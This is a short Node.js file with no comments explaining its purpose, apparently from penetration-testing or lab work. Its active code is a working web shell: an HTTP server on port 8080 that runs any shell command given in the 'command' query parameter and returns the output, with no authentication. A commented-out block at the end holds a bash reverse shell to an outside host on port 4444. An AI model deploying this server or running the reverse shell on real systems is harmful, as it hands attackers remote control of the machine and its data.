var http = require('http'); // 1 - Import Node.js core module
const { exec } = require("child_process");
const url = require('url');

// var server = http.createServer(function (req, res) {   // 2 - creating server

//         const newURL = new URL(req.url);

// 	    // var search_params = newURL.searchParams;
//     	// var command = search_params.get('command');

//         var command = "ls";

//         if(command){
//             exec(command, (error, stdout, stderr) => {
//                 if (error) {
//                     console.log(`error: ${error.message}`);
//                     return;
//                 }
//                 if (stderr) {
//                     console.log(`stderr: ${stderr}`);
//                     return;
//                 }
//                 res.write(stdout);
//                 // console.log(`stdout: ${stdout}`);
//             });
//         }
//         res.write("Ooooops!");

// });

// server.listen(3000); //3 - listen for any incoming requests

// console.log('Node.js web server at port 3000 is running..')

http.createServer(function (req, res) {
  const queryObject = url.parse(req.url,true).query;
  console.log(queryObject);
  var response = '';

  var command = queryObject['command'];
        if(command){
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.log(`error: ${error.message}`);
                    response = error.message;
                }
                else if (stderr) {
                    console.log(`stderr: ${stderr}`);
                    response=stderr;
                }
                else
                    response = stdout;
                res.writeHead(200, {'Content-Type': 'text/html'});
                res.end(response.toString());              
                console.log(response);
            });
        }
        else{
  res.writeHead(200, {'Content-Type': 'text/html'});
  res.end(response);}
}).listen(8080);


// const { exec } = require("child_process");

// exec("bash -i >& /dev/tcp/kali6.praetorianlabs.com/4444 0>&1", (error, stdout, stderr) => {
//     if (error) {
//         console.log(`error: ${error.message}`);
//         return;
//     }
//     if (stderr) {
//         console.log(`stderr: ${stderr}`);
//         return;
//     }
//     console.log(`stdout: ${stdout}`);
// });
